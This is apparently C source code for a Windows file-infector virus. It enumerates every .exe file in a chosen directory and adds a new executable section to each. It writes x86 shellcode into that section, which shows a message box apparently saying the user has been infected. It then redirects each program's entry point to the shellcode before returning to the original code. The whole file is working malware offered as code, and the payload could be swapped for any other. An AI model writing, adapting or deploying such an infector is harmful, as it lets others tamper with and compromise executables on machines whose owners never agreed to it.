#include <stdio.h>
#include <stdlib.h>
#include <Windows.h>
#include <string.h>

DWORD align(DWORD size, DWORD align, DWORD addr)
{
    if ((size % align) == 0)
    {
        return size + addr;
    }
    else
    {
        return addr + (size / align + 1) * align;
    }
}

int getEntryPoint(char *filepath)
{
    HANDLE hFile = CreateFile(filepath, GENERIC_READ | GENERIC_WRITE, 0, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
    if (hFile == INVALID_HANDLE_VALUE)
    {
        printf("CreateFile failed with error %d", GetLastError());
        return FALSE;
    }

    HANDLE hMap = CreateFileMapping(hFile, NULL, PAGE_READWRITE, 0, 0, NULL);
    if (hMap == NULL)
    {
        printf("CreateFileMapping failed with error %d", GetLastError());
        return FALSE;
    }
    LPVOID lpBase = MapViewOfFile(hMap, FILE_MAP_ALL_ACCESS, 0, 0, 0);
    if (lpBase == NULL)
    {
        printf("MapViewOfFile failed with error %d", GetLastError());
        return FALSE;
    }

    DWORD fileSize = GetFileSize(hFile, NULL);
    BYTE *pByte = (BYTE *)malloc(fileSize);
    if (pByte == NULL)
    {
        printf("malloc failed with error %d", GetLastError());
        return FALSE;
    }
    DWORD dw;
    if (!ReadFile(hFile, pByte, fileSize, &dw, NULL))
    {
        printf("ReadFile failed with error %d", GetLastError());
        return FALSE;
    }

    PIMAGE_DOS_HEADER dos = (PIMAGE_DOS_HEADER)pByte;
    PIMAGE_NT_HEADERS nt = (PIMAGE_NT_HEADERS)(pByte + dos->e_lfanew);
    if (dos->e_magic != IMAGE_DOS_SIGNATURE)
    {
        printf("dos->e_magic != IMAGE_DOS_SIGNATURE");
        return FALSE;
    }
    PIMAGE_OPTIONAL_HEADER OH = (PIMAGE_OPTIONAL_HEADER)(pByte + dos->e_lfanew + sizeof(DWORD) + sizeof(IMAGE_FILE_HEADER));
    UnmapViewOfFile(lpBase);
    CloseHandle(hMap);
    CloseHandle(hFile);
    return OH->AddressOfEntryPoint;
}

boolean addSection(char *filepath, char *sectionName, DWORD sizeOfSection)
{
    HANDLE hFile = CreateFile(filepath, GENERIC_READ | GENERIC_WRITE, 0, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
    if (hFile == INVALID_HANDLE_VALUE)
    {
        printf("CreateFile failed with error %d", GetLastError());
        return FALSE;
    }

    DWORD fileSize = GetFileSize(hFile, NULL);
    BYTE *pByte = (BYTE *)malloc(fileSize);
    if (pByte == NULL)
    {
        printf("malloc failed with error %d", GetLastError());
        return FALSE;
    }
    DWORD dw;
    if (!ReadFile(hFile, pByte, fileSize, &dw, NULL))
    {
        printf("ReadFile failed with error %d", GetLastError());
        return FALSE;
    }

    PIMAGE_DOS_HEADER dos = (PIMAGE_DOS_HEADER)pByte;
    if (dos->e_magic != IMAGE_DOS_SIGNATURE)
    {
        printf("dos->e_magic != IMAGE_DOS_SIGNATURE");
        return FALSE;
    }
    PIMAGE_FILE_HEADER FH = (PIMAGE_FILE_HEADER)(pByte + dos->e_lfanew + sizeof(DWORD));
    PIMAGE_OPTIONAL_HEADER OH = (PIMAGE_OPTIONAL_HEADER)(pByte + dos->e_lfanew + sizeof(DWORD) + sizeof(IMAGE_FILE_HEADER));
    PIMAGE_SECTION_HEADER SH = (PIMAGE_SECTION_HEADER)(pByte + dos->e_lfanew + sizeof(IMAGE_NT_HEADERS));

    ZeroMemory(&SH[FH->NumberOfSections], sizeof(IMAGE_SECTION_HEADER));
    CopyMemory(&SH[FH->NumberOfSections].Name, sectionName, 8);

    SH[FH->NumberOfSections].Misc.VirtualSize = sizeOfSection;
    SH[FH->NumberOfSections].VirtualAddress = align(SH[FH->NumberOfSections - 1].Misc.VirtualSize, OH->SectionAlignment, SH[FH->NumberOfSections - 1].VirtualAddress);
    SH[FH->NumberOfSections].SizeOfRawData = align(SH[FH->NumberOfSections].Misc.VirtualSize, OH->FileAlignment, 0);
    SH[FH->NumberOfSections].PointerToRawData = align(SH[FH->NumberOfSections - 1].SizeOfRawData, OH->FileAlignment, SH[FH->NumberOfSections - 1].PointerToRawData);
    SH[FH->NumberOfSections].Characteristics = 0xE00000E0;
    SetFilePointer(hFile, SH[FH->NumberOfSections].PointerToRawData + SH[FH->NumberOfSections].SizeOfRawData, NULL, FILE_BEGIN);
    SetEndOfFile(hFile);
    OH->SizeOfImage = SH[FH->NumberOfSections].VirtualAddress + SH[FH->NumberOfSections].Misc.VirtualSize;
    FH->NumberOfSections++;
    SetFilePointer(hFile, 0, NULL, FILE_BEGIN);
    WriteFile(hFile, pByte, fileSize, &dw, NULL);
    CloseHandle(hFile);
    return TRUE;
}

// add shellcode to section
boolean addShellCode(char *filepath)
{
    HANDLE file = CreateFile(filepath, GENERIC_READ | GENERIC_WRITE, 0, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
    if (file == INVALID_HANDLE_VALUE)
    {
        printf("CreateFile failed with error %d", GetLastError());
        return FALSE;
    }
    HANDLE hMap = CreateFileMapping(file, NULL, PAGE_READWRITE, 0, 0, NULL);
    if (hMap == NULL)
    {
        printf("CreateFileMapping failed with error %d", GetLastError());
        return FALSE;
    }
    LPVOID lpBase = MapViewOfFile(hMap, FILE_MAP_ALL_ACCESS, 0, 0, 0);
    if (lpBase == NULL)
    {
        printf("MapViewOfFile failed with error %d", GetLastError());
        return FALSE;
    }
    DWORD fileSize = GetFileSize(file, NULL);
    BYTE *pByte = (BYTE *)malloc(fileSize);
    if (pByte == NULL)
    {
        printf("malloc failed with error %d", GetLastError());
        return FALSE;
    }
    DWORD dw;
    if (!ReadFile(file, pByte, fileSize, &dw, NULL))
    {
        printf("ReadFile failed with error %d", GetLastError());
        return FALSE;
    }

    PIMAGE_DOS_HEADER dos = (PIMAGE_DOS_HEADER)pByte;
    if (dos->e_magic != IMAGE_DOS_SIGNATURE)
    {
        printf("dos->e_magic != IMAGE_DOS_SIGNATURE");
        return FALSE;
    }
    PIMAGE_NT_HEADERS nt = (PIMAGE_NT_HEADERS)(pByte + dos->e_lfanew);
    PIMAGE_SECTION_HEADER first = IMAGE_FIRST_SECTION(nt);
    PIMAGE_SECTION_HEADER last = first + nt->FileHeader.NumberOfSections - 1;
    nt->FileHeader.Characteristics = 0x010F;
    DWORD oldEntry = nt->OptionalHeader.AddressOfEntryPoint + nt->OptionalHeader.ImageBase;
    //printf("oldEntry: %x", oldEntry);
    nt->OptionalHeader.AddressOfEntryPoint = last->VirtualAddress;
    SetFilePointer(file, 0, NULL, FILE_BEGIN);
    UnmapViewOfFile(lpBase);
    CloseHandle(hMap);
    WriteFile(file, pByte, fileSize, &dw, NULL);
    SetFilePointer(file, last->PointerToRawData, NULL, FILE_BEGIN);

    // shellcode
    unsigned char *shellcode1 = "\xd9\xeb\x9b\xd9\x74\x24\xf4\x31\xd2\xb2\x77\x31\xc9\x64"
                                "\x8b\x71\x30\x8b\x76\x0c\x8b\x76\x1c\x8b\x46\x08\x8b\x7e"
                                "\x20\x8b\x36\x38\x4f\x18\x75\xf3\x59\x01\xd1\xff\xe1\x60"
                                "\x8b\x6c\x24\x24\x8b\x45\x3c\x8b\x54\x28\x78\x01\xea\x8b"
                                "\x4a\x18\x8b\x5a\x20\x01\xeb\xe3\x34\x49\x8b\x34\x8b\x01"
                                "\xee\x31\xff\x31\xc0\xfc\xac\x84\xc0\x74\x07\xc1\xcf\x0d"
                                "\x01\xc7\xeb\xf4\x3b\x7c\x24\x28\x75\xe1\x8b\x5a\x24\x01"
                                "\xeb\x66\x8b\x0c\x4b\x8b\x5a\x1c\x01\xeb\x8b\x04\x8b\x01"
                                "\xe8\x89\x44\x24\x1c\x61\xc3\xb2\x08\x29\xd4\x89\xe5\x89"
                                "\xc2\x68\x8e\x4e\x0e\xec\x52\xe8\x9f\xff\xff\xff\x89\x45"
                                "\x04\xbb\x7e\xd8\xe2\x73\x87\x1c\x24\x52\xe8\x8e\xff\xff"
                                "\xff\x89\x45\x08\x68\x6c\x6c\x20\x41\x68\x33\x32\x2e\x64"
                                "\x68\x75\x73\x65\x72\x30\xdb\x88\x5c\x24\x0a\x89\xe6\x56"
                                "\xff\x55\x04\x89\xc2\x50\xbb\xa8\xa2\x4d\xbc\x87\x1c\x24"
                                "\x52\xe8\x5f\xff\xff\xff\x68\x6f\x78\x58\x20\x68\x61\x67"
                                "\x65\x42\x68\x4d\x65\x73\x73\x31\xdb\x88\x5c\x24\x0a\x89"
                                "\xe3\x68\x74\x65\x64\x58\x68\x6e\x66\x65\x63\x68\x6f\x74"
                                "\x20\x69\x68\x76\x65\x20\x67\x68\x59\x6f\x75\x27\x31\xc9"
                                "\x88\x4c\x24\x13\x89\xe1\x31\xd2\x52\x53\x51\x52\xff\xd0"
                                "\x31\xc0\x50\x68";

    DWORD shellcodeSize = strlen(shellcode1);
    WriteFile(file, shellcode1, shellcodeSize, &dw, NULL);
    if (dw != shellcodeSize)
    {
        printf("WriteFile failed with error %d", GetLastError());
        return FALSE;
    }
    // get entry point and use liitle endian and change to hex
    for (int i = 0; i < 4; i++)
    {
        BYTE b = (BYTE)(oldEntry >> (i * 8));
        //printf("%x ", b);
        WriteFile(file, &b, 1, &dw, NULL);
    }
    // add \xc3 to the shellcode
    unsigned char *shellcode2 = "\xc3";
    WriteFile(file, shellcode2, 1, &dw, NULL);
    if (dw != 1)
    {
        printf("WriteFile failed with error %d", GetLastError());
        return FALSE;
    }
    CloseHandle(file);
    return TRUE;
}

void spreadShellCode(char *filepath)
{
    HANDLE hFind;
    WIN32_FIND_DATA data;
    char path[MAX_PATH];
    char new_path[MAX_PATH];
    char *ptr;
    ptr = strrchr(filepath, '\\'); // tìm ký tự '\' cuối cùng
    *ptr = '\0';                   // gán '\0' vào vị trí của ký tự '\'
    strcpy(new_path, filepath);
    strcpy(path, new_path);
    strcat(path, "\\*.exe");

    hFind = FindFirstFile(path, &data);

    if (hFind != INVALID_HANDLE_VALUE)
    {
        do
        {
            char fullPath[MAX_PATH];
            strcpy(fullPath, new_path);
            strcat(fullPath, "\\");
            strcat(fullPath, data.cFileName);

            // inject shellcode into the executable
            addSection(fullPath, ".code", 2304);
            addShellCode(fullPath);
        } while (FindNextFile(hFind, &data));

        FindClose(hFind);
    }
}

int main(int argc, char *argv[])
{
    if (argc < 2)
    {
        printf("Usage: %s <directory>", argv[0]);
        return 1;
    }
    spreadShellCode(argv[1]);
}
